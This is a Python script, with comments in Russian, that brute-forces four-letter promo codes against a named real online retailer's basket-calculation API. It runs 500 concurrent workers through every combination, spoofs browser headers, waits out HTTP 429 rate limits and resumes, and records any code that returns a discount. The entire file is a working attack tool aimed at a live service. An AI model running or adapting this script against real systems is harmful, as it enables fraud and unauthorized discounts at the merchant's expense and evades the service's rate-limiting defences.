import asyncio
import aiohttp
import json
import string
import math
import time
import sys
import copy
from pathlib import Path

# ---------------- НАСТРОЙКИ ----------------
PAYLOAD_TEMPLATE = {
    "data": [{
        "products": [
            {"id": 31180, "quantity": 1},
            {"id": 15906, "quantity": 1},
            {"id": 420984, "quantity": 1},
            {"id": 520377, "quantity": 1},
            {"id": 518040, "quantity": 1},
            {"id": 518041, "quantity": 1},
            {"id": 427571, "quantity": 1},
        ],
        "lang": "ru",
        "promoCode": "",
        "isGift": True,
    }],
    "mode": "prod"
}

POOL_SIZE = 500
DELAY_PER_WORKER = 0.03
URL = "https://basket-back.genotek.ru/deal-calc"
SITE_ROOT = "https://basket.genotek.ru/"
TOTAL_CODES = 26 ** 4
CHARS = string.ascii_uppercase

DEFAULT_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://basket.genotek.ru",
    "Referer": "https://basket.genotek.ru/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
}

FOUND_FILE = Path("found_codes.json")
found_codes = []
checked_count = 0
start_time = 0.0
lock = asyncio.Lock()


# ---------------- ВСПОМОГАТЕЛЬНЫЕ ----------------
def get_code_from_index(index: int) -> str:
    i4 = index % 26
    i3 = (index // 26) % 26
    i2 = (index // (26 ** 2)) % 26
    i1 = (index // (26 ** 3)) % 26
    return f"{CHARS[i1]}{CHARS[i2]}{CHARS[i3]}{CHARS[i4]}"


def progress_bar(done, total, width=30):
    pct = done / total if total else 0
    bar_len = int(width * pct)
    bar = "█" * bar_len + "─" * (width - bar_len)
    return f"[{bar}] {done}/{total} ({pct*100:.2f}%)"


def save_found(found):
    try:
        if FOUND_FILE.exists():
            try:
                cur = json.loads(FOUND_FILE.read_text(encoding="utf-8")) or []
            except Exception:
                cur = []
            codes = {c["code"] for c in cur}
            for f in found:
                if f["code"] not in codes:
                    cur.append(f)
        else:
            cur = found.copy()
        FOUND_FILE.write_text(json.dumps(cur, ensure_ascii=False, indent=2), encoding="utf-8")
    except Exception as e:
        print(f"\n[!] Не удалось сохранить найденные коды: {e}")


# ---------------- СЕТЬ ----------------
async def check_code(session: aiohttp.ClientSession, code: str):
    payload = copy.deepcopy(PAYLOAD_TEMPLATE)
    payload["data"][0]["promoCode"] = code
    data = aiohttp.FormData()
    data.add_field("json", json.dumps(payload, ensure_ascii=False))

    async with session.post(URL, data=data) as resp:
        text = await resp.text()
        if resp.status == 429:
            return {"__status": 429}
        if resp.status != 200:
            return None

        # Пробуем обычный и двойной JSON
        try:
            js = await resp.json()
        except Exception:
            js = None
        if isinstance(js, str):
            try:
                js = json.loads(js)
            except Exception:
                pass
        if not js:
            try:
                js = json.loads(text)
            except Exception:
                return None
        return js


# ---------------- ОБРАБОТКА ----------------
def process_result(code: str, result):
    if not isinstance(result, dict):
        return False

    data_field = result.get("data")
    # иногда data — это строка вроде "Promo not found"
    if isinstance(data_field, str):
        return False
    if not isinstance(data_field, list) or not data_field:
        return False

    data0 = data_field[0]
    if not isinstance(data0, dict):
        return False

    promo = data0.get("promo", {})
    discount = promo.get("discount")

    # products может быть словарём
    products = data0.get("products", {})
    if isinstance(products, dict):
        total_price = sum((p.get("PRICE", 0) or 0) for p in products.values())
    elif isinstance(products, list):
        total_price = sum((p.get("PRICE", 0) or 0) for p in products)
    else:
        total_price = 0

    if discount:
        found = {
            "code": code,
            "discount": f"{discount} ₽",
            "finalPrice": f"{total_price:.2f} ₽",
        }
        found_codes.append(found)
        save_found([found])
        print(f"\n🎉 Найден промокод: {code} | скидка {discount} ₽ | итого {total_price:.2f} ₽")
        return True
    return False


# ---------------- ВОРКЕРЫ ----------------
async def worker(worker_id: int, start_index: int, end_index: int, session: aiohttp.ClientSession):
    global checked_count
    print(f"[Воркер #{worker_id}] диапазон: {start_index}-{end_index-1}")
    for i in range(start_index, end_index):
        code = get_code_from_index(i)
        result = await check_code(session, code)
        if isinstance(result, dict) and result.get("__status") == 429:
            print(f"[Воркер #{worker_id}] 429 на {code}, жду 60 сек...")
            await asyncio.sleep(60)
            continue
        if result:
            process_result(code, result)
        async with lock:
            checked_count += 1
        await asyncio.sleep(DELAY_PER_WORKER)


async def display_progress():
    global checked_count
    try:
        while True:
            async with lock:
                done = checked_count
            elapsed = max(1, time.time() - start_time)
            spd = done / elapsed * 60
            eta = (TOTAL_CODES - done) / (spd / 60) if spd > 0 else math.inf
            bar = progress_bar(done, TOTAL_CODES)
            sys.stdout.write(f"\r{bar} | {spd:.1f}/min | ETA {eta/3600:.1f}h | Found {len(found_codes)}")
            sys.stdout.flush()
            await asyncio.sleep(2)
    except asyncio.CancelledError:
        pass


# ---------------- MAIN ----------------
async def main():
    global start_time
    start_time = time.time()
    connector = aiohttp.TCPConnector(limit_per_host=POOL_SIZE, limit=0)

    async with aiohttp.ClientSession(headers=DEFAULT_HEADERS, connector=connector) as session:
        try:
            async with session.get(SITE_ROOT):
                pass
        except:
            pass

        print("Проверка тестового кода EBSFL28283 ...")
        test_res = await check_code(session, "EBSFL28283")
        if test_res and process_result("EBSFL28283", test_res):
            print("\n✅ Тестовый код вернул скидку! Запускаем воркеры через 3 секунды...")
            await asyncio.sleep(3)
        else:
            print("\n❌ Что-то не так с тестом. Проверь структуру ответа.")
            return

        chunk = math.ceil(TOTAL_CODES / POOL_SIZE)
        tasks = [
            worker(i + 1, i * chunk, min((i + 1) * chunk, TOTAL_CODES), session)
            for i in range(POOL_SIZE)
        ]
        progress = asyncio.create_task(display_progress())
        await asyncio.gather(*tasks)
        progress.cancel()
        try:
            await progress
        except:
            pass

    print("\n\nПеребор завершён.")
    if found_codes:
        print("🎉 Найденные промокоды:")
        for f in found_codes:
            print(f)
    else:
        print("😔 Валидных промокодов не найдено.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nОстановлено пользователем.")
